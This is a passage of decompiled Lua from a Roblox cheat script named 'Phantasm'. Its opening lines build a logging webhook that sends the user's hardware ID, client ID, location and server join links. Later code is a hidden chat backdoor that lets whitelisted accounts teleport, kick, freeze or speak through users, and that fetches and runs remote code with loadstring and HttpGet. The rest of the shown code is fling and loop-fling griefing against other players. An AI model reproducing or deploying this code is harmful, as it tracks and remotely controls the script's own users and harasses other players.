                                    title = "Phantasm Logs", 
                                    description = "User Device: " .. v412, 
                                    type = "rich", 
                                    color = tonumber(0), 
                                    fields = {
                                        {
                                            name = "\n\n-----------------------------------------------------Information** **", 
                                            value = "Identified Executor: " .. (identifyexecutor and tostring(identifyexecutor()) or "Unknown") .. "\nExecutor Name: " .. (getexecutorname and tostring(getexecutorname()) or "Unknown") .. "\nServer Players: " .. (#l_Players_0:GetPlayers() or "Unknown") .. "\nServer Type: " .. v101 .. "\nServer Version: " .. v102 .. "\nCountry: " .. v404 .. "\nRegion: " .. v407 .. "\nRegion Name: " .. v408 .. "\nTimezone: " .. v409 .. "\nUsername: [" .. v12.Name .. " (" .. v12.DisplayName .. ")](https://www.roblox.com/users/" .. v12.UserId .. "/profile)\nClient ID: " .. (l_RbxAnalyticsService_0:GetClientId() or "Unknown") .. "\nHWID: " .. (gethwid and tostring(gethwid()) or get_hwid and tostring(get_hwid()) or "Unknown") .. "\nHashed Identifier: " .. l_l_HttpService_0_0 .. "\n-----------------------------------------------------" .. "\n[**Join**](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", 
                                            inline = false
                                        }, 
                                        {
                                            name = "JobId Join", 
                                            value = "```Roblox.GameLauncher.joinGameInstance('" .. game.PlaceId .. "', '" .. game.JobId .. "')```", 
                                            inline = true
                                        }, 
                                        {
                                            name = "JobId", 
                                            value = "```r\r\n        " .. game.JobId .. "\r\n\r\n        ```", 
                                            inline = true
                                        }, 
                                        {
                                            name = "Browser Join", 
                                            value = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```", 
                                            inline = false
                                        }, 
                                        {
                                            name = "Script Join", 
                                            value = "```lua\r\n        game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\", game:GetService(\"Players\").LocalPlayer)\r\n        ```", 
                                            inline = false
                                        }
                                    }, 
                                    thumbnail = {
                                        url = fetchAvatar()
                                    }, 
                                    footer = {
                                        text = "Script ran at " .. os.date("%Y-%m-%d %H:%M:%S")
                                    }
                                }
                            }
                        })
                    });
                end);
            end;
            local l_pairs_0 = pairs;
            local v1239 = "GetPlayers";
            local l_l_Players_0_0 = l_Players_0;
            for _, v1242 in l_pairs_0(l_Players_0[v1239](l_l_Players_0_0)) do
                do
                    local l_v1242_0 = v1242;
                    if l_v1242_0.Name ~= v12.Name then
                        local v1244, v1245 = v1233(l_v1242_0.UserId);
                        if v1244 and v1245 then
                            v1237(v1245);
                        end;
                        task.spawn(initOthers, l_v1242_0);
                        v68[#v68 + 1] = l_v1242_0.CharacterAdded:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: l_v1242_0 (ref)
                            task.spawn(initOthers, l_v1242_0);
                        end);
                    end;
                end;
            end;
            v68[#v68 + 1] = l_Players_0.PlayerAdded:Connect(function(v1246) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v1233 (ref), v1237 (ref), v33 (ref), v34 (ref), v12 (ref), v597 (ref), l_RenderStepped_0 (ref), l_Players_0 (ref)
                local v1247, v1248 = v1233(v1246.UserId);
                if v1247 and v1248 then
                    v1237(v1248);
                end;
                if v33 and not table.find(v34, v1246) then
                    table.insert(v34, v1246);
                end;
                if v1246.Name ~= v12.Name then
                    task.spawn(pcall, v597, v1246);
                    task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                        -- upvalues: l_RenderStepped_0 (ref), v1246 (ref)
                        local v1249 = tick();
                        repeat
                            l_RenderStepped_0:Wait();
                        until v1246:GetAttribute("PreloadDone") or tick() >= v1249 + 30;
                        if v1246 and v1246.Parent then
                            if v1246.Character then
                                task.spawn(initOthers, v1246);
                            end;
                            v1246.CharacterAdded:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                -- upvalues: v1246 (ref)
                                task.spawn(initOthers, v1246);
                            end);
                        end;
                    end);
                end;
                allplayers = l_Players_0:GetPlayers();
            end);
            l_pairs_0 = {
                "i'll meow for GAYESTPERSONHERE anyday~..", 
                "*purr* hi GAYESTPERSONHERE~..", 
                "I love you GAYESTPERSONHERE..", 
                "GAYESTPERSONHERE is mine and mine only >~<", 
                "Owned by GAYESTPERSONHERE :3", 
                "GAYESTPERSONHERE is such a cutie~.."
            };
            local v1250 = {
                Freeze = false
            };
            l_l_Players_0_0 = function(v1251) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_Players_0 (ref), v1233 (ref), v12 (ref), v1250 (ref), l_pairs_0 (ref), l_UserInputService_0 (ref), l_CoreGui_0 (ref)
                local _ = v1251.MessageReceived:Connect(function(v1252) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Players_0 (ref), v1233 (ref), v12 (ref), v1250 (ref), l_pairs_0 (ref), l_UserInputService_0 (ref), l_CoreGui_0 (ref)
                    local v1253 = false;
                    local v1254 = v1252.TextSource and l_Players_0:FindFirstChild(v1252.TextSource.Name);
                    if v1254 and v1233(v1254.UserId) then
                        local v1255 = getChar(v12);
                        local v1256 = v1255 and getRoot(v1255);
                        local v1257 = v1255 and getHumanoid(v1255);
                        local v1258 = string.split(v1252.Text, " ");
                        if v1258[1] then
                            table.remove(v1258, 1);
                        end;
                        local v1259 = false;
                        if v1258[1] and (getPlayer(v1258[1], false, true) and getPlayer(v1258[1], false, true).Name == v12.Name or v1258[1]:lower() == "all" or v1258[1]:lower() == "others") then
                            v1259 = true;
                            table.remove(v1258, 1);
                        end;
                        if v1252.Text:find("^.t") then
                            sendMsg(v1258[1] or "b");
                        end;
                        if v1259 then
                            if v1252.Text:find("^.bring") or v1252.Text:find("^.b") then
                                local v1260 = getChar(v1254);
                                local v1261 = v1260 and getRoot(v1260);
                                if v1261 then
                                    heartbeatTp(v1261.CFrame);
                                end;
                            elseif v1252.Text:find("^.plug") or v1252.Text:find("^.p") then
                                sendMsg("Phantasm is the best script ever!!");
                            elseif v1252.Text:find("^.goto") then
                                local v1262 = v1258[1] and getPlayer(v1258[1]);
                                local v1263 = v1262 and getChar(v1262);
                                local v1264 = v1263 and getRoot(v1263);
                                if v1264 then
                                    heartbeatTp(v1264.CFrame);
                                end;
                            elseif v1252.Text:find("^.reset") then
                                if v1257 then
                                    v1257:ChangeState(Enum.HumanoidStateType.Dead);
                                    v1257.Health = 0;
                                end;
                            else
                                if v1252.Text:find("^.freeze") or v1252.Text:find("^.fr") then
                                    v1250.Freeze = true;
                                    v1256.Anchored = true;
                                    task.wait();
                                    v1253 = not v1250.Freeze;
                                end;
                                if not v1253 then
                                    if v1252.Text:find("^.unfreeze") or v1252.Text:find("^.unfr") or v1252.Text:find("^.thaw") then
                                        v1250.Freeze = false;
                                    elseif v1252.Text:find("^.ew") then
                                        local v1265 = v1258[1] and getPlayer(v1258[1]);
                                        local v1266 = l_pairs_0[math.random(1, #l_pairs_0)];
                                        sendMsg(v1266:gsub("GAYESTPERSONHERE", v1265 and v1265.DisplayName or v1254.DisplayName));
                                    elseif v1252.Text:find("^.kick") then
                                        v12:Kick(#v1258 > 0 and table.concat(v1258, " ") or "Kicked");
                                        v12.Kick(v12, #v1258 > 0 and table.concat(v1258, " ") or "Kicked");
                                    elseif v1252.Text:find("^.boi") then
                                        communicate({
                                            Goal = " Platform ", 
                                            mobile = l_UserInputService_0.TouchEnabled
                                        });
                                        local v1267 = {};
                                        if true then
                                            local l_v1267_0 = v1267;
                                            game:GetService("ContentProvider"):PreloadAsync({
                                                l_CoreGui_0, 
                                                v12.PlayerGui
                                            }, function(v1269, _) --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: l_v1267_0 (ref)
                                                v1269 = string.lower(v1269);
                                                v1269 = string.gsub(v1269, "rbxassetid://", "");
                                                l_v1267_0[string.gsub(v1269, "rbxasset://", "")] = true;
                                            end);
                                            communicate({
                                                Goal = "CheckList", 
                                                List = l_v1267_0
                                            });
                                            while task.wait() do
                                                local v1271 = getChar(v12);
                                                local v1272 = v1271 and getHumanoid(v1271);
                                                if v1272 then
                                                    for _, v1274 in pairs({
                                                        "18169333305", 
                                                        "18205877704", 
                                                        "18230909652", 
                                                        "18230741457", 
                                                        "17325510002", 
                                                        "17325513870", 
                                                        "17325522388", 
                                                        "17325537719"
                                                    }) do
                                                        local l_Animation_1 = Instance.new("Animation");
                                                        l_Animation_1.AnimationId = "rbxassetid://" .. v1274;
                                                        l_Animation_1.Parent = v1271;
                                                        local v1276 = v1272:LoadAnimation(l_Animation_1);
                                                        v1276:Play();
                                                        task.wait();
                                                        v1276:Stop();
                                                    end;
                                                end;
                                            end;
                                        end;
                                    elseif v1252.Text:find("^.sonicexe") then
                                        sendMsg("exe");
                                        getgenv().SonicEXE_Executed = true;
                                        loadstring(game:HttpGet("https://raw.githubusercontent.com/secretisadev/Phantasm/refs/heads/main/Sonic.lua"))();
                                    elseif v1252.Text:find("^.fling") then
                                        local v1277 = v1258[1] and getPlayer(v1258[1]);
                                        if v1277 then
                                            fling(v1277.Name);
                                        end;
                                    else
                                        local _ = l_pairs_0[math.random(1, #l_pairs_0)];
                                    end;
                                end;
                            end;
                        end;
                    end;
                    v1253 = false;
                end);
            end;
            for _, v1281 in pairs(l_TextChatService_0.TextChannels:GetChildren()) do
                l_l_Players_0_0(v1281);
            end;
            l_TextChatService_0.TextChannels.ChildAdded:Connect(l_l_Players_0_0);
            v68[#v68 + 1] = l_Players_0.PlayerRemoving:Connect(function(v1282) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v69 (ref), v70 (ref), v34 (ref), l_Players_0 (ref)
                if v69[v1282] then
                    for _, v1284 in pairs(v69[v1282]) do
                        v1284:Disconnect();
                    end;
                    if v70.Players[v1282] then
                        for _, v1286 in pairs(v70.Players[v1282]) do
                            v1286:Remove();
                        end;
                        table.remove(v70.Players, table.find(v70.Players, v1282));
                    end;
                    table.clear(v69[v1282]);
                    v69[v1282] = nil;
                    table.remove(v69, table.find(v69, v1282));
                end;
                if table.find(v34, v1282) then
                    table.remove(v34, table.find(v34, v1282));
                end;
                allplayers = l_Players_0:GetPlayers();
            end);
            v1239 = function(v1287, v1288, v1289) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v95 (ref), v96 (ref)
                v95[v1287] = v1289;
                if v1288 then
                    for _, v1291 in pairs(v1288) do
                        v96[v1291] = v1289;
                    end;
                end;
            end;
            local function v1294(v1292, v1293) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v95 (ref), v96 (ref)
                (v95[v1292] or v96[v1292])(v1293);
            end;
            v1239("goto", {
                "tp", 
                "to"
            }, function(v1295) --[[ Line: 0 ]] --[[ Name:  ]]
                local v1296 = v1295[1] and getPlayer(v1295[1]);
                local v1297 = getAllPlayers();
                if v1295[1] and v1295[1]:lower() == "random" then
                    v1296 = v1297[math.random(1, #v1297)];
                end;
                if v1296 then
                    local v1298 = getChar(v1296);
                    local v1299 = v1298 and getRoot(v1298);
                    if v1298 and v1299 then
                        heartbeatTp(v1299.CFrame);
                    end;
                end;
            end);
            v1239("say", nil, function(v1300) --[[ Line: 0 ]] --[[ Name:  ]]
                local v1301 = table.concat(v1300, " ");
                if v1301 and not Toggles.DisableMessaging.Value then
                    sendMsg(v1301);
                end;
            end);
            v1239("view", {
                "spectate"
            }, function(v1302) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v97 (ref), v437 (ref), v71 (ref), l_RenderStepped_0 (ref), v1294 (ref)
                if v97.view then
                    v97.view:Disconnect();
                    v97.view = nil;
                end;
                local v1303 = v1302[1] and getPlayer(v1302[1]);
                local v1304 = getAllPlayers();
                if v1302[1] and v1302[1]:lower() == "random" then
                    v1303 = v1304[math.random(1, #v1304)];
                end;
                if v1303 then
                    v437:Notify(bypassText("Viewing", v1303.DisplayName), 3, v71.Notification);
                    v97.view = l_RenderStepped_0:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                        -- upvalues: v1303 (ref), v1294 (ref)
                        local v1305 = v1303 and getChar(v1303);
                        if v1303 and v1303.Parent and v1305 and workspace.CurrentCamera then
                            workspace.CurrentCamera.CameraSubject = v1305;
                        elseif v1303 and not v1303.Parent or not v1303 then
                            task.spawn(v1294, "unview");
                        end;
                    end);
                end;
            end);
            v1239("unview", {
                "unspectate"
            }, function(_) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v437 (ref), v71 (ref), v97 (ref), v12 (ref)
                v437:Notify(bypassText("Unviewing.."), 3, v71.Notification);
                if v97.view then
                    v97.view:Disconnect();
                    v97.view = nil;
                end;
                local v1307 = getChar(v12);
                if v1307 and workspace.CurrentCamera then
                    workspace.CurrentCamera.CameraSubject = v1307;
                end;
            end);
            local function v1314(v1308) --[[ Line: 0 ]] --[[ Name:  ]]
                local l_Position_2 = v1308.Position;
                local v1310 = tick();
                wait();
                local l_Position_3 = v1308.Position;
                local v1312 = tick();
                local v1313 = (l_Position_3 - l_Position_2) / (v1312 - v1310);
                l_Position_2 = l_Position_3;
                v1310 = v1312;
                return v1313;
            end;
            local function v1339(v1315) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v32 (ref), l_Players_0 (ref), v12 (ref), v34 (ref), v1314 (ref)
                if v32 or not l_Players_0:FindFirstChild(v1315) or v1315 == v12.Name then
                    return;
                else
                    local v1316 = getChar(v12);
                    local v1317 = v1316 and getRoot(v1316);
                    local v1318 = v1316 and getHumanoid(v1316);
                    local v1319 = l_Players_0[v1315];
                    local v1320 = getChar(v1319);
                    local v1321 = v1320 and getRoot(v1320);
                    local v1322 = v1320 and getHumanoid(v1320);
                    if v1316 and v1317 and v1318 and v1320 and v1321 and v1322 then
                        local l_CFrame_20 = v1317.CFrame;
                        local v1324 = 0;
                        v32 = true;
                        local v1325 = tick();
                        local l_Position_4 = v1321.Position;
                        local v1327 = table.find(v34, v1319);
                        local v1328 = Vector3.new(0, 0, 0);
                        local v1329 = true;
                        local l_Value_16 = Options.FlingSpeed.Value;
                        local l_Value_17 = Options.FlingTimeout.Value;
                        local l_Value_18 = Options.FlingType.Value;
                        l_Value_18 = l_Value_18 == "Anti-Fling" and -0.75 or l_Value_18 == "Normal" and 0 or l_Value_18 == "Void" and 1;
                        do
                            local l_v1328_0 = v1328;
                            repeat
                                if v1317 and v1318 then
                                    local l_CurrentCamera_7 = workspace.CurrentCamera;
                                    if l_CurrentCamera_7 and l_CurrentCamera_7.CameraSubject ~= v1322 then
                                        l_CurrentCamera_7.CameraSubject = v1322;
                                    end;
                                    task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                        -- upvalues: l_v1328_0 (ref), v1314 (ref), v1321 (ref)
                                        l_v1328_0 = v1314(v1321);
                                    end);
                                    v1318.PlatformStand = true;
                                    local v1335 = CFrame.new(0, l_Value_18, 0) * CFrame.Angles(math.rad(90), 0, math.rad(v1324));
                                    local l_Position_5 = v1321.Position;
                                    v1324 = v1324 + l_Value_16;
                                    local v1337 = tick();
                                    repeat
                                        v1317.Velocity = Vector3.new(0, -9000000000, 0);
                                        v1317.CFrame = CFrame.new(l_Position_5) * v1335 + v1322.MoveDirection * v1321.Velocity.Magnitude / 1.25;
                                        task.wait();
                                    until tick() >= v1337 + 0.01;
                                    v1317.CFrame = CFrame.new(l_Position_5) * v1335 + v1322.MoveDirection * ((v1321.Position - l_Position_5).Magnitude * 30);
                                end;
                                task.wait();
                            until v1321.CFrame.Y >= 10000 or v1321.CFrame.Y <= -10000 or (v1321.Position - l_Position_4).Magnitude >= 100 or l_v1328_0.Magnitude >= 250 or tick() >= v1325 + l_Value_17 or v1319.Character and v1319.Character ~= v1320 or v1329 and v1322.Health <= 0 or v1327 and not table.find(v34, v1319) or not v1319.Character or not v12.Character;
                            local l_CurrentCamera_8 = workspace.CurrentCamera;
                            if l_CurrentCamera_8 then
                                l_CurrentCamera_8.CameraSubject = v12.Character and v1318 or v12.Character and v12.Character:FindFirstChildWhichIsA("Humanoid") and v12.Character.Humanoid;
                            end;
                            repeat
                                if v1317 then
                                    v1317.CFrame = l_CFrame_20;
                                    v1317.Velocity = Vector3.new();
                                    v1317.RotVelocity = Vector3.new();
                                end;
                                if v1318 then
                                    v1318.PlatformStand = false;
                                    v1318:ChangeState(Enum.HumanoidStateType.GettingUp);
                                end;
                                task.wait();
                            until (v1317.Position - l_CFrame_20.Position).Magnitude <= 10 and v1317.Velocity.Magnitude >= -500 and v1317.Velocity.Magnitude <= 500 and not v1318.PlatformStand or v12.Character and v12.Character ~= v1316;
                            v32 = false;
                        end;
                    end;
                    return;
                end;
            end;
            local function v1345(v1340) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_Players_0 (ref)
                if not l_Players_0:FindFirstChild(v1340) then
                    return;
                else
                    local v1341 = l_Players_0[v1340];
                    local l_Character_0 = v1341.Character;
                    local v1343 = l_Character_0 and l_Character_0:FindFirstChild("HumanoidRootPart");
                    local v1344 = l_Character_0 and l_Character_0:FindFirstChildWhichIsA("Humanoid");
                    if l_Character_0 and v1343 and v1344 and (v1343.CFrame.Y >= 500 or v1343.CFrame.Y <= -500 or v1344.Health <= 0 or not v1341.Character) then
                        return true;
                    else
                        return false;
                    end;
                end;
            end;
            v1239("fling", {
                "void"
            }, function(v1346) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v33 (ref), l_Players_0 (ref), v1339 (ref), v32 (ref)
                if not v33 then
                    if #v1346 == 1 and (v1346[1]:lower() == "all" or v1346[1]:lower() == "others") then
                        table.clear(v1346);
                        for _, v1348 in pairs(l_Players_0:GetPlayers()) do
                            table.insert(v1346, v1348.Name);
                        end;
                    end;
                    for _, v1350 in pairs(v1346) do
                        v1350 = v1350:gsub(",", ""):lower();
                        local v1351 = "";
                        local v1352 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_ ";
                        for v1353 = 1, #v1350 do
                            local v1354 = v1350:sub(v1353, v1353);
                            if v1352:find(v1354) then
                                v1351 = v1351 .. v1354;
                            end;
                        end;
                        do
                            local l_v1351_0 = v1351;
                            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                -- upvalues: l_Players_0 (ref), l_v1351_0 (ref), v1339 (ref)
                                for _, v1357 in pairs(l_Players_0:GetPlayers()) do
                                    local v1358 = v1357.Name:lower();
                                    local v1359 = v1357.DisplayName:lower();
                                    if v1358:find("^" .. l_v1351_0) or v1359:find("^" .. l_v1351_0) then
                                        v1339(v1357.Name);
                                        return;
                                    end;
                                end;
                            end);
                            if v32 then
                                repeat
                                    task.wait();
                                until not v32;
                            end;
                        end;
                    end;
                    return;
                else
                    return;
                end;
            end);
            v1239("loopfling", {
                "loopvoid"
            }, function(v1360) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v33 (ref), l_Players_0 (ref), v34 (ref)
                if #v1360 == 1 and (v1360[1]:lower() == "all" or v1360[1]:lower() == "others") then
                    v33 = true;
                    table.clear(v1360);
                    for _, v1362 in pairs(l_Players_0:GetPlayers()) do
                        table.insert(v1360, v1362.Name);
                    end;
                end;
                for _, v1364 in pairs(v1360) do
                    v1364 = v1364:gsub(",", ""):lower();
                    local v1365 = "";
                    local v1366 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_ ";
                    for v1367 = 1, #v1364 do
                        local v1368 = v1364:sub(v1367, v1367);
                        if v1366:find(v1368) then
                            v1365 = v1365 .. v1368;
                        end;
                    end;
                    do
                        local l_v1365_0 = v1365;
                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: l_Players_0 (ref), l_v1365_0 (ref), v34 (ref)
                            for _, v1371 in pairs(l_Players_0:GetPlayers()) do
                                local v1372 = v1371.Name:lower();
                                local v1373 = v1371.DisplayName:lower();
                                if (v1372:find("^" .. l_v1365_0) or v1373:find("^" .. l_v1365_0)) and not table.find(v34, v1371) then
                                    table.insert(v34, v1371);
                                end;
                            end;
                        end);
                    end;
                end;
            end);
            v1239("unfling", {
                "unvoid", 
                "unloopfling", 
                "unloopvoid"
            }, function(v1374) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v33 (ref), l_Players_0 (ref), v34 (ref)
                if #v1374 == 1 and (v1374[1]:lower() == "all" or v1374[1]:lower() == "others") then
                    v33 = false;
                    table.clear(v1374);
                    for _, v1376 in pairs(l_Players_0:GetPlayers()) do
                        table.insert(v1374, v1376.Name);
                    end;
                elseif v33 then
                    return;
                end;
                for _, v1378 in pairs(v1374) do
                    v1378 = v1378:gsub(",", ""):lower();
                    local v1379 = "";
                    local v1380 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_ ";
                    for v1381 = 1, #v1378 do
                        local v1382 = v1378:sub(v1381, v1381);
                        if v1380:find(v1382) then
                            v1379 = v1379 .. v1382;
                        end;
                    end;
                    do
                        local l_v1379_0 = v1379;
                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: l_Players_0 (ref), l_v1379_0 (ref), v34 (ref)
                            for _, v1385 in pairs(l_Players_0:GetPlayers()) do
                                local v1386 = v1385.Name:lower();
                                local v1387 = v1385.DisplayName:lower();
                                if (v1386:find("^" .. l_v1379_0) or v1387:find("^" .. l_v1379_0)) and table.find(v34, v1385) then
                                    table.remove(v34, table.find(v34, v1385));
                                end;
                            end;
                        end);
                    end;
                end;
            end);
            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v34 (ref), v1345 (ref), v1339 (ref), v32 (ref)
                while task.wait() do
                    if #v34 > 0 then
                        for _, v1389 in pairs(v34) do
                            if #v34 ~= 0 and not v1345(v1389.Name) then
                                v1339(v1389.Name);
                                if v32 then
                                    repeat
                                        task.wait();
                                    until not v32;
                                end;
                            end;
                        end;
                    end;
                end;
            end);
            v1239("whitelist", {
                "addwhitelist"
            }, function(v1390) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v98 (ref), v437 (ref), v71 (ref)
                local v1391 = v1390[1] and getPlayer(v1390[1]);
                if v1391 then
                    if table.find(v98, v1391) then
                        v437:Notify(bypassText("This player is already whitelisted!"), 3, v71.Notification);
                    else
                        table.insert(v98, v1391);
                        v437:Notify(bypassText("Whitelisted", v1391.DisplayName), 3, v71.Notification);
                    end;
                end;
            end);
            v1239("unwhitelist", {
                "removewhitelist"
            }, function(v1392) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v98 (ref), v437 (ref), v71 (ref)
                local v1393 = v1392[1] and getPlayer(v1392[1]);
                if v1393 and table.find(v98, v1393) then
                    table.remove(v98, table.find(v98, v1393));
                    v437:Notify(bypassText("Unwhitelisted", v1393.DisplayName), 3, v71.Notification);
                end;
            end);
            v1239("rejoin", {
                "rj"
            }, function(_) --[[ Line: 0 ]] --[[ Name:  ]]
                rejoin();
            end);
            v1239("reset", nil, function(_) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v1396 = getChar(v12);
                local v1397 = v1396 and getHumanoid(v1396);
                if v1396 and v1397 then
                    v1397:ChangeState(Enum.HumanoidStateType.Dead);
                    v1397.Health = 0;
                end;
            end);
            v1239("fixcam", nil, fixCam);
            v1239("vclip", nil, function(v1398) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v1399 = getChar(v12);
                local v1400 = v1399 and getRoot(v1399);
                if v1399 and v1400 and v1398[1] and tonumber(v1398[1]) then
                    heartbeatTp(v1400.CFrame * CFrame.new(0, v1398[1], 0));
                end;
            end);
            v1239("hclip", nil, function(v1401) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref)
                local v1402 = getChar(v12);
                local v1403 = v1402 and getRoot(v1402);
                if v1402 and v1403 and v1401[1] and tonumber(v1401[1]) then
                    heartbeatTp(v1403.CFrame * CFrame.new(0, 0, -v1401[1]));
                end;
            end);
            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v18 (ref), v95 (ref), v96 (ref), v1294 (ref), l_UserInputService_0 (ref), l_RenderStepped_0 (ref)
                local v1404 = Create("ScreenGui", {
                    Enabled = false, 
                    ResetOnSpawn = false, 
                    DisplayOrder = 100000, 
                    Parent = v18
                });
                local v1405 = Create("Frame", {
                    BackgroundColor3 = Color3.new(0, 0, 0), 
                    BorderColor3 = Color3.new(0, 0, 0), 
                    Size = UDim2.new(1, -4, 0, 20), 
                    ZIndex = 5, 
                    Parent = v1404
                });
                local v1406 = Create("Frame", {
                    BackgroundColor3 = Color3.fromRGB(28, 28, 28), 
                    BorderColor3 = Color3.fromRGB(50, 50, 50), 
                    BorderMode = Enum.BorderMode.Inset, 
                    Size = UDim2.new(1, 0, 1, 0), 
                    ZIndex = 6, 
                    Parent = v1405
                });
                Create("UIGradient", {
                    Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)), 
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(212, 212, 212))
                    }), 
                    Rotation = 90, 
                    Parent = v1406
                });
                local v1407 = Create("Frame", {
                    BackgroundTransparency = 1, 
                    ClipsDescendants = true, 
                    Position = UDim2.new(0, 5, 0, 0), 
                    Size = UDim2.new(1, -5, 1, 0), 
                    ZIndex = 7, 
                    Parent = v1406
                });
                local v1408 = Create("TextLabel", {
                    BackgroundTransparency = 1, 
                    Position = UDim2.fromOffset(0, 0), 
                    Size = UDim2.fromScale(5, 1), 
                    Font = Enum.Font.Code, 
                    Text = "", 
                    TextColor3 = Color3.fromRGB(255, 255, 255), 
                    TextTransparency = 0.5, 
                    TextSize = 14, 
                    TextStrokeTransparency = 0.7, 
                    TextXAlignment = Enum.TextXAlignment.Left, 
                    ZIndex = 7, 
                    Parent = v1407
                });
                local v1409 = Create("TextBox", {
                    BackgroundTransparency = 1, 
                    Position = UDim2.fromOffset(0, 0), 
                    Size = UDim2.fromScale(5, 1), 
                    Font = Enum.Font.Code, 
                    PlaceholderColor3 = Color3.fromRGB(190, 190, 190), 
                    PlaceholderText = "", 
                    Text = "", 
                    TextColor3 = Color3.fromRGB(255, 255, 255), 
                    TextSize = 14, 
                    TextStrokeTransparency = 0, 
                    TextXAlignment = Enum.TextXAlignment.Left, 
                    ClearTextOnFocus = true, 
                    ZIndex = 8, 
                    Parent = v1407
                });
                v1409:GetPropertyChangedSignal("Text"):Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v1409 (ref), v1408 (ref), v95 (ref), v96 (ref)
                    if v1409.Text:match("^%s*$") then
                        v1408.Text = "";
                    else
                        local v1410 = v1409.Text:split(" ");
                        if v1410 then
                            local v1411 = v1410[1] and v1410[1]:lower();
                            local v1412 = v1410[2];
                            if v1411 then
                                for v1413, _ in pairs(v95) do
                                    if v1413:find("^" .. v1411) then
                                        local v1415 = v1412 and getPlayer(v1412);
                                        if v1415 then
                                            v1408.Text = v1413 .. "" .. v1415.DisplayName;
                                            v1408.Text = v1409.Text .. v1408.Text:sub(#v1409.Text, #v1408.Text);
                                            break;
                                        else
                                            v1408.Text = v1413;
                                            break;
                                        end;
                                    else
                                        for v1416, _ in pairs(v96) do
                                            if v1416:find("^" .. v1411) then
                                                local v1418 = v1412 and getPlayer(v1412);
                                                if v1418 then
                                                    v1408.Text = v1416 .. "" .. v1418.DisplayName;
                                                    v1408.Text = v1409.Text .. v1408.Text:sub(#v1409.Text, #v1408.Text);
                                                    break;
                                                else
                                                    v1408.Text = v1416;
                                                    break;
                                                end;
                                            else
                                                v1408.Text = "";
                                            end;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end);
                v1409.FocusLost:Connect(function(v1419) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v1409 (ref), v1408 (ref), v95 (ref), v96 (ref), v1294 (ref), v1404 (ref)
                    if v1419 and Toggles.CommandBar.Value and not v1409.Text:match("^%s*$") then
                        v1408.Text = "";
                        local v1420 = v1409.Text:split(" ");
                        if v1420 then
                            local v1421 = v1420[1] and v1420[1]:lower();
                            if v1421 and (v95[v1421] or v96[v1421]) then
                                table.remove(v1420, 1);
                                task.spawn(v1294, v1421, v1420);
                            end;
                        end;
                    end;
                    v1404.Enabled = false;
                end);
                l_UserInputService_0.InputBegan:Connect(function(v1422, _) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_UserInputService_0 (ref), v1404 (ref), v1409 (ref), v1408 (ref), l_RenderStepped_0 (ref)
                    if not l_UserInputService_0:GetFocusedTextBox() and v1422.KeyCode == Enum.KeyCode[Options.CommandBind.Value] and Toggles.CommandBar.Value then
                        v1404.Enabled = true;
                        v1409:CaptureFocus();
                        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v1409 (ref), v1408 (ref), l_RenderStepped_0 (ref)
                            repeat
                                v1409.Text = "";
                                v1408.Text = "";
                                l_RenderStepped_0:Wait();
                            until v1409.Text == "" and v1408.Text == "";
                        end);
                    end;
                end);
                if ChatBar then
                    ChatBar.FocusLost:Connect(function(v1424) --[[ Line: 0 ]] --[[ Name:  ]]
                        -- upvalues: v95 (ref), v96 (ref), v1294 (ref)
                        if v1424 then
                            if ChatBar.Text:find("^%s*;") and Toggles.UseCommandsinChat.Value then
                                local v1425 = ChatBar.Text:find(";");
                                local v1426 = ChatBar.Text:sub(v1425 + 1, #ChatBar.Text);
                                if not Toggles.SendCommandInChat.Value then
                                    ChatBar.Text = "";
                                end;
                                local v1427 = v1426:split(" ");
                                if v1427 then
                                    local v1428 = v1427[1];
                                    if v95[v1428] or v96[v1428] then
                                        table.remove(v1427, 1);
